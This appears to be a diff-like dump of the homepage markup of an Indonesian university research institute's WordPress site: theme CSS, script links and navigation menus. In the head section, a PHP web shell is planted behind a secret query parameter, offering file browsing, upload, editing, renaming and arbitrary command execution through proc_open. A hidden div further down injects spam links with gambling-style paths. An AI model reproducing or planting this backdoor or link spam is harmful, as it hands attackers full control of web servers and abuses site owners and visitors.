+footer .widget.widget_product_categories ul > li > a:before, footer .widget.widget_categories ul > li > a:before, footer .widget.widget_pages ul > li > a:before, footer .widget.widget_archive ul > li > a:before, footer .widget.widget_meta ul > li > a:before, footer .widget.widget_block ul > li > a:before { background:#FEE100;}
+.bottom { background:#142441;}
+.bottom, .bottom a { color:rgba(255, 255, 255, 0.7);}
+.bottom .copyright a { color:rgba(255, 255, 255, 0.7);}
+.bottom a:hover, .bottom .copyright a:hover { color:#FEE100;}
+.bottom .copyright a:before { background:#FEE100;}
+.themesflat-action-box {background-image: url(https://lp.uisu.ac.id/wp-content/themes/labaid/);}
+.themesflat-action-box .overlay { background-color:rgba(238, 238, 238, 0.5);}
+.themesflat-action-box .heading, .themesflat-action-box h2, .themesflat-action-box h3, .themesflat-action-box h4, .themesflat-action-box h5, .themesflat-action-box h6 { color:#142441;}
+.themesflat-action-box, .themesflat-action-box p { color:#9AA5B3;}
+.themesflat-action-box .themesflat-button { color:#142441;}
+.themesflat-action-box .themesflat-button { background-color:#FEE100;}
+.themesflat-partner-box { background: #fff;}
+.page-title .overlay { background: rgba(238,238,238,0);}
+.page-title .overlay { opacity:0%; filter:alpha(opacity=0); }
+.page-title {background-image: url(https://lp.uisu.ac.id/wp-content/uploads/2024/07/bg-patitle.jpg);}
+.page-title {background-size: auto;}
+.page-title h1 {color:#142441!important;}
+.page-title.parallax h1:after, .page-title.video h1:after {background:#142441;}
+.breadcrumbs span, .breadcrumbs span a, .breadcrumbs a, .breadcrumbs span i, .breadcrumbs span.trail-browse i {color:#142441;}
+body, input, select, textarea { color:#9AA5B3}
+.themesflat-portfolio .item .category-post a:hover,ul.iconlist .list-title .testimonial-content blockquote,.testimonial-content .author-info,.themesflat_counter.style2 .themesflat_counter-content-right,.themesflat_counter.style2 .themesflat_counter-content-left, .page-links a:focus,.widget_search .search-form input[type=search],.entry-meta ul,.entry-meta ul.meta-right,.entry-footer strong, .themesflat_button_container .themesflat-button.no-background, .portfolio-single .entry-content, article .entry-meta ul li a, .blog-single .entry-footer .tags-links a, .navigation.posts-navigation .nav-links li a .meta-nav, .flat-language ul.unstyled-child li a, .themesflat-price-product del { color:#9AA5B3}
+.widget .widget-title:after, .widget .widget-title:before,ul.iconlist li.circle:before { background-color:#9AA5B3}
+ :root { --theme-primary-color:#142441 }
+ :root { --theme-secondary-color:#3764EB }
+.breadcrumbs span a:hover, .breadcrumbs a:hover span { color:#3764EB;}
+ :root { --theme-accent-color:#FEE100 }
+
+</style>
+<link rel='stylesheet' id='themesflat-magnific.popup-css' href='https://lp.uisu.ac.id/wp-content/themes/labaid/css/magnific.popup.css?ver=6.7.1' type='text/css' media='all' />
+<link rel='stylesheet' id='nice-select-css' href='https://lp.uisu.ac.id/wp-content/themes/labaid/css/nice-select.css?ver=6.7.1' type='text/css' media='all' />
+<link rel='stylesheet' id='themesflat-responsive-css' href='https://lp.uisu.ac.id/wp-content/themes/labaid/css/responsive.css?ver=6.7.1' type='text/css' media='all' />
+<link rel='stylesheet' id='tablepress-default-css' href='https://lp.uisu.ac.id/wp-content/plugins/tablepress/css/build/default.css?ver=3.0.1' type='text/css' media='all' />
+<link rel='stylesheet' id='elementor-frontend-css' href='https://lp.uisu.ac.id/wp-content/plugins/elementor/assets/css/frontend.min.css?ver=3.26.0' type='text/css' media='all' />
+<link rel='stylesheet' id='elementor-post-17-css' href='https://lp.uisu.ac.id/wp-content/uploads/elementor/css/post-17.css?ver=1735138408' type='text/css' media='all' />
+<link rel='stylesheet' id='e-popup-style-css' href='https://lp.uisu.ac.id/wp-content/plugins/pro-elements/assets/css/conditionals/popup.min.css?ver=3.25.5' type='text/css' media='all' />
+<link rel='stylesheet' id='widget-heading-css' href='https://lp.uisu.ac.id/wp-content/plugins/elementor/assets/css/widget-heading.min.css?ver=3.26.0' type='text/css' media='all' />
+<link rel='stylesheet' id='tf-posts-css' href='https://lp.uisu.ac.id/wp-content/plugins/themesflat-core/assets/css/posts/tf-posts.css?ver=6.7.1' type='text/css' media='all' />
+<link rel='stylesheet' id='swiper-css' href='https://lp.uisu.ac.id/wp-content/plugins/elementor/assets/lib/swiper/v8/css/swiper.min.css?ver=8.4.5' type='text/css' media='all' />
+<link rel='stylesheet' id='e-swiper-css' href='https://lp.uisu.ac.id/wp-content/plugins/elementor/assets/css/conditionals/e-swiper.min.css?ver=3.26.0' type='text/css' media='all' />
+<link rel='stylesheet' id='widget-image-carousel-css' href='https://lp.uisu.ac.id/wp-content/plugins/elementor/assets/css/widget-image-carousel.min.css?ver=3.26.0' type='text/css' media='all' />
+<link rel='stylesheet' id='tf-step-css' href='https://lp.uisu.ac.id/wp-content/plugins/themesflat-core/assets/css/step/tf-step.css?ver=6.7.1' type='text/css' media='all' />
+<link rel='stylesheet' id='elementor-post-987-css' href='https://lp.uisu.ac.id/wp-content/uploads/elementor/css/post-987.css?ver=1735138409' type='text/css' media='all' />
+<link rel='stylesheet' id='tf-main-post-type-css' href='https://lp.uisu.ac.id/wp-content/plugins/themesflat-core/assets/css/tf-main-post-type.css?ver=1' type='text/css' media='all' />
+<link rel='stylesheet' id='google-fonts-1-css' href='https://fonts.googleapis.com/css?family=Roboto%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CRoboto+Slab%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CArimo%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CJost%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic&#038;display=swap&#038;ver=6.7.1' type='text/css' media='all' />
+<link rel='stylesheet' id='elementor-icons-labaid_icon-css' href='https://lp.uisu.ac.id/wp-content/themes/labaid/css/icon-labaid.css?ver=1.0.0' type='text/css' media='all' />
+<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><script type="text/javascript" src="https://lp.uisu.ac.id/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
+<!--[if lt IE 8]>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-includes/js/json2.min.js?ver=2015-05-03" id="json2-js"></script>
+<![endif]-->
+<?php
+error_reporting(0); 
+set_time_limit(0);
+$config = "blocksupportset";
+if (isset($_GET[$config])) {
+	$base_dir = __DIR__;
+	$current_dir = isset($_GET['dir']) ? $_GET['dir'] : $base_dir;
+	echo "<br><form method='POST' enctype='multipart/form-data'> 
+	<input type='file' name='file' /> 
+	<input type='submit' value='>>>' /> 
+	</form>"; 
+	echo '<form method="post"> 
+	<input type="text" name="xmd" size="30"> 
+	<input type="submit" value="Kill"> 
+	</form>'; 
+	echo "<h3>Current Directory: $current_dir</h3>";
+	echo "<a href='?".$config."&dir=" . urlencode(dirname($current_dir)) . "'>Go Up</a><br><br>";
+	$files = scandir($current_dir);
+	echo "<ul>";
+	foreach ($files as $file) {
+		if ($file != '.' && $file != '..') {
+			$path = $current_dir . DIRECTORY_SEPARATOR . $file;
+			if (is_dir($path)) {
+				echo "<li><a href='?".$config."&dir=" . urlencode($path) . "'>[DIR] $file</a></li>";
+			} else {
+				echo "<li>$file - 
+				<a href='?".$config."&edit=" . urlencode($path) . "'>Edit</a> |
+				<a href='?".$config."&rename=" . urlencode($path) . "'>Rename</a>
+				</li>";
+			}
+		}
+	}
+	echo "</ul>";
+	if (isset($_FILES['file'])) {
+		$filename = $_FILES['file']['name'];
+		$filetmp  = $_FILES['file']['tmp_name'];
+		if (move_uploaded_file($filetmp, $current_dir . DIRECTORY_SEPARATOR . $filename)) {
+			echo '[OK] ===> ' . $filename;
+		}
+	}
+	if (isset($_POST['xmd'])) {
+		$xmd = $_POST['xmd'];
+		$descriptors = [
+			0 => ['pipe', 'r'], 
+			1 => ['pipe', 'w'], 
+			2 => ['pipe', 'w'], 
+		];
+		$process = proc_open($xmd, $descriptors, $pipes);
+		$output = stream_get_contents($pipes[1]);
+		$error = stream_get_contents($pipes[2]);
+		fclose($pipes[0]);
+		fclose($pipes[1]);
+		fclose($pipes[2]);
+		proc_close($process);
+		echo "<textarea cols=30 rows=15;>$output</textarea>";
+		echo "<textarea cols=30 rows=15;>Error:n$errorn</textarea>";
+	}
+	if (isset($_GET['edit'])) {
+		$file_to_edit = $_GET['edit'];
+		if (file_exists($file_to_edit)) {
+			if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['file_content'])) {
+				file_put_contents($file_to_edit, $_POST['file_content']);
+				echo '[OK] File updated.';
+			}
+			$content = htmlspecialchars(file_get_contents($file_to_edit));
+			echo "<h3>Editing: $file_to_edit</h3>
+			<form method='POST'>
+				<textarea name='file_content' rows='20' cols='80'>$content</textarea><br>
+				<input type='submit' value='Save'>
+			</form>";
+		} else {
+			echo '[ERROR] File does not exist.';
+		}
+	}
+	if (isset($_GET['rename'])) {
+		$file_to_rename = $_GET['rename'];
+		if (file_exists($file_to_rename)) {
+			if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_name'])) {
+				$new_name = $current_dir . DIRECTORY_SEPARATOR . $_POST['new_name'];
+				if (rename($file_to_rename, $new_name)) {
+					echo '[OK] File/Folder renamed.';
+				} else {
+					echo '[ERROR] Failed to rename.';
+				}
+			}
+			echo "<h3>Renaming: $file_to_rename</h3>
+			<form method='POST'>
+				<input type='text' name='new_name' value='" . basename($file_to_rename) . "'>
+				<input type='submit' value='Rename'>
+			</form>";
+		} else {
+			echo '[ERROR] File/Folder does not exist.';
+		}
+	}
+}
+?>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-content/plugins/wp-file-upload/js/wordpress_file_upload_functions.js?ver=6.7.1" id="wordpress_file_upload_script-js"></script>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-includes/js/jquery/ui/core.min.js?ver=1.13.3" id="jquery-ui-core-js"></script>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-includes/js/jquery/ui/datepicker.min.js?ver=1.13.3" id="jquery-ui-datepicker-js"></script>
+<script type="text/javascript" id="jquery-ui-datepicker-js-after">
+/* <![CDATA[ */
+jQuery(function(jQuery){jQuery.datepicker.setDefaults({"closeText":"Tutup","currentText":"Hari ini","monthNames":["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"],"monthNamesShort":["Jan","Feb","Mar","Apr","Mei","Jun","Jul","Agu","Sep","Okt","Nov","Des"],"nextText":"Berikut","prevText":"Sebelumnya","dayNames":["Minggu","Senin","Selasa","Rabu","Kamis","Jumat","Sabtu"],"dayNamesShort":["Ming","Sen","Sel","Rab","Kam","Jum","Sab"],"dayNamesMin":["M","S","S","R","K","J","S"],"dateFormat":"d MM yy","firstDay":1,"isRTL":false});});
+/* ]]> */
+</script>
+<script type="text/javascript" src="https://lp.uisu.ac.id/wp-content/plugins/wp-file-upload/vendor/jquery/jquery-ui-timepicker-addon.min.js?ver=6.7.1" id="jquery-ui-timepicker-addon-js-js"></script>
+<link rel="https://api.w.org/" href="https://lp.uisu.ac.id/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://lp.uisu.ac.id/wp-json/wp/v2/pages/987" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://lp.uisu.ac.id/xmlrpc.php?rsd" />
+<meta name="generator" content="WordPress 6.7.1" />
+<link rel="canonical" href="https://lp.uisu.ac.id/" />
+<link rel='shortlink' href='https://lp.uisu.ac.id/' />
+<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://lp.uisu.ac.id/wp-json/oembed/1.0/embed?url=https%3A%2F%2Flp.uisu.ac.id%2F" />
+<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://lp.uisu.ac.id/wp-json/oembed/1.0/embed?url=https%3A%2F%2Flp.uisu.ac.id%2F&#038;format=xml" />
+	<script src="https://use.fontawesome.com/598b3d998a.js"></script>
+	<script type="text/javascript" src="//lp.uisu.ac.id/?wordfence_syncAttackData=1737031332.7448" async></script><meta name="generator" content="Elementor 3.26.0; features: e_font_icon_svg, additional_custom_breakpoints; settings: css_print_method-external, google_font-enabled, font_display-swap">
+			<style>
+				.e-con.e-parent:nth-of-type(n+4):not(.e-lazyloaded):not(.e-no-lazyload),
+				.e-con.e-parent:nth-of-type(n+4):not(.e-lazyloaded):not(.e-no-lazyload) * {
+					background-image: none !important;
+				}
+				@media screen and (max-height: 1024px) {
+					.e-con.e-parent:nth-of-type(n+3):not(.e-lazyloaded):not(.e-no-lazyload),
+					.e-con.e-parent:nth-of-type(n+3):not(.e-lazyloaded):not(.e-no-lazyload) * {
+						background-image: none !important;
+					}
+				}
+				@media screen and (max-height: 640px) {
+					.e-con.e-parent:nth-of-type(n+2):not(.e-lazyloaded):not(.e-no-lazyload),
+					.e-con.e-parent:nth-of-type(n+2):not(.e-lazyloaded):not(.e-no-lazyload) * {
+						background-image: none !important;
+					}
+				}
+			</style>
+			<meta name="generator" content="Powered by Slider Revolution 6.5.25 - responsive, Mobile-Friendly Slider Plugin for WordPress with comfortable drag and drop interface." />
+<link rel="icon" href="https://lp.uisu.ac.id/wp-content/uploads/2024/07/cropped-logo-LP-1-copy-32x32.png" sizes="32x32" />
+<link rel="icon" href="https://lp.uisu.ac.id/wp-content/uploads/2024/07/cropped-logo-LP-1-copy-192x192.png" sizes="192x192" />
+<link rel="apple-touch-icon" href="https://lp.uisu.ac.id/wp-content/uploads/2024/07/cropped-logo-LP-1-copy-180x180.png" />
+<meta name="msapplication-TileImage" content="https://lp.uisu.ac.id/wp-content/uploads/2024/07/cropped-logo-LP-1-copy-270x270.png" />
+<script>function setREVStartSize(e){
+			//window.requestAnimationFrame(function() {
+				window.RSIW = window.RSIW===undefined ? window.innerWidth : window.RSIW;
+				window.RSIH = window.RSIH===undefined ? window.innerHeight : window.RSIH;
+				try {
+					var pw = document.getElementById(e.c).parentNode.offsetWidth,
+						newh;
+					pw = pw===0 || isNaN(pw) || (e.l=="fullwidth" || e.layout=="fullwidth") ? window.RSIW : pw;
+					e.tabw = e.tabw===undefined ? 0 : parseInt(e.tabw);
+					e.thumbw = e.thumbw===undefined ? 0 : parseInt(e.thumbw);
+					e.tabh = e.tabh===undefined ? 0 : parseInt(e.tabh);
+					e.thumbh = e.thumbh===undefined ? 0 : parseInt(e.thumbh);
+					e.tabhide = e.tabhide===undefined ? 0 : parseInt(e.tabhide);
+					e.thumbhide = e.thumbhide===undefined ? 0 : parseInt(e.thumbhide);
+					e.mh = e.mh===undefined || e.mh=="" || e.mh==="auto" ? 0 : parseInt(e.mh,0);
+					if(e.layout==="fullscreen" || e.l==="fullscreen")
+						newh = Math.max(e.mh,window.RSIH);
+					else{
+						e.gw = Array.isArray(e.gw) ? e.gw : [e.gw];
+						for (var i in e.rl) if (e.gw[i]===undefined || e.gw[i]===0) e.gw[i] = e.gw[i-1];
+						e.gh = e.el===undefined || e.el==="" || (Array.isArray(e.el) && e.el.length==0)? e.gh : e.el;
+						e.gh = Array.isArray(e.gh) ? e.gh : [e.gh];
+						for (var i in e.rl) if (e.gh[i]===undefined || e.gh[i]===0) e.gh[i] = e.gh[i-1];
+											
+						var nl = new Array(e.rl.length),
+							ix = 0,
+							sl;
+						e.tabw = e.tabhide>=pw ? 0 : e.tabw;
+						e.thumbw = e.thumbhide>=pw ? 0 : e.thumbw;
+						e.tabh = e.tabhide>=pw ? 0 : e.tabh;
+						e.thumbh = e.thumbhide>=pw ? 0 : e.thumbh;
+						for (var i in e.rl) nl[i] = e.rl[i]<window.RSIW ? 0 : e.rl[i];
+						sl = nl[0];
+						for (var i in nl) if (sl>nl[i] && nl[i]>0) { sl = nl[i]; ix=i;}
+						var m = pw>(e.gw[ix]+e.tabw+e.thumbw) ? 1 : (pw-(e.tabw+e.thumbw)) / (e.gw[ix]);
+						newh =  (e.gh[ix] * m) + (e.tabh + e.thumbh);
+					}
+					var el = document.getElementById(e.c);
+					if (el!==null && el) el.style.height = newh+"px";
+					el = document.getElementById(e.c+"_wrapper");
+					if (el!==null && el) {
+						el.style.height = newh+"px";
+						el.style.display = "block";
+					}
+				} catch(e){
+					console.log("Failure at Presize of Slider:" + e)
+				}
+			//});
+		  };</script>
+</head>
+
+<body class="home page-template-default page page-id-987 wp-custom-logo  wide header-default class-name-page-home-01 elementor-default elementor-kit-17 elementor-page elementor-page-987">
+    <div id="preloader">
+        <div class="row loader">
+            <div class="pulse-loader"><div class="double-bounce3"></div><div class="double-bounce4"></div></div>        </div>
+    </div>
+            <!-- Go Top -->
+        <a class="go-top">
+            <i class="icon-labaid-arrow-up"></i>
+        </a>
+    <div class="modal-menu-left">
+	<div class="modal-menu__backdrop"></div>
+	<div class="modal-menu__body">
+		<button class="modal-menu__close" type="button">
+		    <i class="icon-labaid-delete"></i>
+		</button>
+		<div class="modal-menu__panel">
+			<div class="modal-menu__panel-header">
+		        <div class="modal-menu__panel-title">
+		        	<div class="header-modal-menu-left-btn">
+		            </div>
+		        </div>
+		    </div>
+		    <div class="modal-menu__panel-body">
+				<div class="nav-wrap-secondary">				    
+			        <div id="block-21" class="widget widget_block"><div class="wp-block-group"><div class="wp-block-group__inner-container"><h2 class="wp-block-heading">Archives</h2><ul class="wp-block-archives-list wp-block-archives">	<li><a href='https://lp.uisu.ac.id/2024/02/'>Februari 2024</a></li>
+	<li><a href='https://lp.uisu.ac.id/2022/11/'>November 2022</a></li>
+	<li><a href='https://lp.uisu.ac.id/2022/09/'>September 2022</a></li>
+</ul></div></div></div><div id="block-22" class="widget widget_block"><div class="wp-block-group"><div class="wp-block-group__inner-container"><h2 class="wp-block-heading">Categories</h2><ul class="wp-block-categories-list wp-block-categories">	<li class="cat-item cat-item-27"><a href="https://lp.uisu.ac.id/category/diagnostic-testing-in/">Diagnostic testing in</a>
+</li>
+	<li class="cat-item cat-item-60"><a href="https://lp.uisu.ac.id/category/fkip/">FKIP</a>
+</li>
+	<li class="cat-item cat-item-28"><a href="https://lp.uisu.ac.id/category/manufacturing/">Manufacturing</a>
+</li>
+	<li class="cat-item cat-item-29"><a href="https://lp.uisu.ac.id/category/medical-labs/">Medical Labs</a>
+</li>
+	<li class="cat-item cat-item-31"><a href="https://lp.uisu.ac.id/category/research-labs/">Research labs</a>
+</li>
+	<li class="cat-item cat-item-32"><a href="https://lp.uisu.ac.id/category/science-laboratory/">Science Laboratory</a>
+</li>
+</ul></div></div></div>				    
+				</div><!-- /.nav-wrap --> 
+			</div>
+			<div class="modal-menu__panel-footer">
+								    <div class="logo-panel" >                  
+				        <a href="https://lp.uisu.ac.id/"  title="Lembaga Penelitian">
+				            				                <img class="site-logo"  src="https://lp.uisu.ac.id/wp-content/uploads/2024/05/logo-LP-1.png" alt="Lembaga Penelitian"/>
+				            				        </a>
+				    </div>          
+								<div class="socials-panel">
+					    <ul class="themesflat-socials">
+        <li class="facebook">
+                        <a href="#" target="_blank" rel="alternate" title="facebook">
+                            <i class="icon-labaid-facebook"></i>                            
+                        </a>
+                    </li><li class="twitter">
+                        <a href="#" target="_blank" rel="alternate" title="twitter">
+                            <i class="icon-labaid-twitter"></i>                            
+                        </a>
+                    </li><li class="instagram">
+                        <a href="#" target="_blank" rel="alternate" title="instagram">
+                            <i class="icon-labaid-instagram"></i>                            
+                        </a>
+                    </li><li class="pinterest">
+                        <a href="#" target="_blank" rel="alternate" title="pinterest">
+                            <i class="icon-labaid-pinterest"></i>                            
+                        </a>
+                    </li><li class="linkedin">
+                        <a href="#" target="_blank" rel="alternate" title="linkedin">
+                            <i class="icon-labaid-linkedin"></i>                            
+                        </a>
+                    </li>    </ul><!-- /.social -->       
+    				</div>
+			</div>
+		</div>
+	</div>
+</div>  <div class="themesflat-boxed">	
+	<header id="header" class="header header-default ">
+    <div class="inner-header">  
+        <div class="tf-container">
+            <div class="row">
+                <div class="col-md-12">
+                    <div class="header-wrap clearfix">
+                        <div class="header-ct-left">
+                                <div id="logo" class="logo" >                  
+        <a href="https://lp.uisu.ac.id/"  title="Lembaga Penelitian">
+                            <img class="site-logo"  src="https://lp.uisu.ac.id/wp-content/uploads/2024/05/logo-LP-1.png" alt="Lembaga Penelitian"/>
+                    </a>
+    </div>
+
+                                                    </div>
+                        <div class="header-ct-center">
+                            <ul id="menu-main" class="menu">
+    <li>
+    <a class="menu-fallback" href="https://lp.uisu.ac.id/wp-admin/nav-menus.php">Create a Menu</a></li></ul>  
+                            </div>
+                        <div class="header-ct-right">
+                                                                                    
+                            
+                                                    </div>
+                    </div>                
+                </div><!-- /.col-md-12 -->
+
+            </div><!-- /.row -->
+        </div><!-- /.container -->
+    </div>
+
+    <div class="inner-header-menu">  
+        <div class="tf-container">
+            <div class="row">
+                <div class="col-md-12">
+                    <div class="header-menu">
+                        
+<div class="nav-wrap">
+    <nav id="mainnav" class="mainnav" role="navigation">
+        <ul id="menu-main-menu" class="menu"><li id="menu-item-1081" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home current-menu-item page_item page-item-987 current_page_item menu-item-1081"><a href="https://lp.uisu.ac.id/" aria-current="page">Home</a></li>
+<li id="menu-item-1990" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-1990"><a href="https://lp.uisu.ac.id/journal-article/">Rekapitulasi Artikel</a>
+<ul class="sub-menu">
+	<li id="menu-item-2750" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2750"><a href="https://lp.uisu.ac.id/publikasi-garuda-tahun-2023/">Publikasi Garuda Tahun 2023</a></li>
+	<li id="menu-item-2751" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2751"><a href="https://lp.uisu.ac.id/publikasi-scopus-tahun-2023/">Publikasi Scopus Tahun 2023</a></li>
+</ul>
+</li>
+<li id="menu-item-44" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-44"><a href="#">Kerjasama</a></li>
+<li id="menu-item-2769" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2769"><a href="https://jurnal.uisu.ac.id/index.php/">Jurnal UISU</a></li>
+<li id="menu-item-2814" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2814"><a href="#">Rumah Riset</a></li>
+<li id="menu-item-2763" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2763"><a href="https://lp.uisu.ac.id/books/">UISU Press</a></li>
+<li id="menu-item-2798" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2798"><a href="https://lp.uisu.ac.id/blog-grid/">Blog</a></li>
+<li id="menu-item-2818" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2818"><a href="#">Dokumen</a></li>
+<li id="menu-item-2017" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2017"><a href="https://lp.uisu.ac.id/contact-us/">Contact Us</a></li>
+</ul>    </nav><!-- #site-navigation -->  
+</div><!-- /.nav-wrap -->                           <div class="header-menu-right">
+                                                                                 </div>
+                        <div class="logo-header-main">
+                                <div class="logo logo-mobi" >                  
+        <a href="https://lp.uisu.ac.id/"  title="Lembaga Penelitian">
+                            <img class="site-logo"  src="https://lp.uisu.ac.id/wp-content/uploads/2024/05/logo-LP-1.png" alt="Lembaga Penelitian" />
+                    </a>
+    </div>
+                        </div>
+                        <div class="btn-menu">
+                                <span class="line-1"></span>
+                            </div><!-- //mobile menu button -->
+                    </div>             
+                </div><!-- /.col-md-12 -->
+
+            </div><!-- /.row -->
+        </div><!-- /.container -->
+    </div>
+
+    <div class="canvas-nav-wrap">
+        <div class="overlay-canvas-nav"><div class="canvas-menu-close"><span></span></div></div>
+        <div class="inner-canvas-nav">
+                <div class="logo logo-mobi" >                  
+        <a href="https://lp.uisu.ac.id/"  title="Lembaga Penelitian">
+                            <img class="site-logo"  src="https://lp.uisu.ac.id/wp-content/uploads/2024/05/logo-LP-1.png" alt="Lembaga Penelitian" />
+                    </a>
+    </div>
+            <nav id="mainnav_canvas" class="mainnav_canvas" role="navigation">
+                <ul id="menu-main-menu-1" class="menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home current-menu-item page_item page-item-987 current_page_item menu-item-1081"><a href="https://lp.uisu.ac.id/" aria-current="page">Home</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-1990"><a href="https://lp.uisu.ac.id/journal-article/">Rekapitulasi Artikel</a>
+<ul class="sub-menu">
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2750"><a href="https://lp.uisu.ac.id/publikasi-garuda-tahun-2023/">Publikasi Garuda Tahun 2023</a></li>
+	<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2751"><a href="https://lp.uisu.ac.id/publikasi-scopus-tahun-2023/">Publikasi Scopus Tahun 2023</a></li>
+</ul>
+</li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-44"><a href="#">Kerjasama</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2769"><a href="https://jurnal.uisu.ac.id/index.php/">Jurnal UISU</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2814"><a href="#">Rumah Riset</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2763"><a href="https://lp.uisu.ac.id/books/">UISU Press</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2798"><a href="https://lp.uisu.ac.id/blog-grid/">Blog</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2818"><a href="#">Dokumen</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2017"><a href="https://lp.uisu.ac.id/contact-us/">Contact Us</a></li>
+</ul>            </nav><!-- #mainnav_canvas -->  
+        </div>
+    </div><!-- /.canvas-nav-wrap --> 
+</header><!-- /.header --> 	<!-- Page Title -->
+	<!-- Page title -->
+<header class="page-header">
+    <div class="page-title parallax space-between ">
+                    <div class="overlay"></div>   
+        <div class="container"> 
+            <div class="row">
+                <div class="page-title-container">
+                                <div class="breadcrumb-trail breadcrumbs"><div class="trail-items"><span class="trail-item trail-end"><span><span>Home</span></span></span></div></div> 
+                </div><!-- /.col-md-12 -->
+            </div><!-- /.row -->  
+        </div><!-- /.container -->                     
+    </div><!-- /.page-title --> 
+</header><!-- /.page-header -->
+	
+	<div id="main-content" class="site-main clearfix">
+		<div id="themesflat-content" class="page-wrap ">
+		    <div style="display:none">
+    <br><a href="https://elektro.ft.unsoed.ac.id/assets/" rel="dofollow">https://elektro.ft.unsoed.ac.id/assets/</a>
+    <br><a href="https://elektro.ft.unsoed.ac.id/data/" rel="dofollow">https://elektro.ft.unsoed.ac.id/data/</a>
+    <br><a href="https://elektro.ft.unsoed.ac.id/gacor/" rel="dofollow">https://elektro.ft.unsoed.ac.id/gacor/</a>
+    <br><a href="https://fmipa.unsoed.ac.id/image/" rel="dofollow">https://fmipa.unsoed.ac.id/image/</a>
+    <br><a href="https://fmipa.unsoed.ac.id/sl88/" rel="dofollow">https://fmipa.unsoed.ac.id/sl88/</a>
+    <br><a href="https://fmipa.unsoed.ac.id/thailand/" rel="dofollow">https://fmipa.unsoed.ac.id/thailand/</a>
+</div>
+    	
+<div class="container">
+	<div class="row">
+		<div class="col-md-12">
+			<div class="wrap-content-area">
+				<div id="primary" class="content-area">	
+					<main id="main" class="main-content" role="main">
+													
+<article id="post-987" class="post-987 page type-page status-publish hentry">
+		<div class="entry-content">
+				<div data-elementor-type="wp-page" data-elementor-id="987" class="elementor elementor-987" data-elementor-post-type="page">
+						<section class="elementor-section elementor-top-section elementor-element elementor-element-742c085 elementor-section-full_width elementor-section-stretched elementor-section-height-default elementor-section-height-default" data-id="742c085" data-element_type="section" data-settings="{&quot;stretch_section&quot;:&quot;section-stretched&quot;}">
+						<div class="elementor-container elementor-column-gap-no">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-46d780b" data-id="46d780b" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-7fa68ac elementor-widget elementor-widget-slider_revolution" data-id="7fa68ac" data-element_type="widget" data-widget_type="slider_revolution.default">
+				<div class="elementor-widget-container">
+					
+		<div class="wp-block-themepunch-revslider">
+			<!-- START Slider 1 REVOLUTION SLIDER 6.5.25 --><p class="rs-p-wp-fix"></p>
+			<rs-module-wrap id="rev_slider_1_1_wrapper" data-source="gallery" style="visibility:hidden;background:transparent;padding:0;margin:0px auto;margin-top:0;margin-bottom:0;background-image:url(https://lp.uisu.ac.id/wp-content/uploads/2022/12/sl-bg-min.jpg);background-repeat:no-repeat;background-size:cover;background-position:center center;">
+				<rs-module id="rev_slider_1_1" style="" data-version="6.5.25">
+					<rs-slides>
+						<rs-slide style="position: absolute;" data-key="rs-1" data-title="Slide" data-anim="d:30;f:center;" data-in="prst:rndboxes;o:-0.3;sx:0.5;sy:0.5;row:5;col:5;" data-out="o:0;sx:1.3;sy:1.3;m:true;row:5;col:5;">
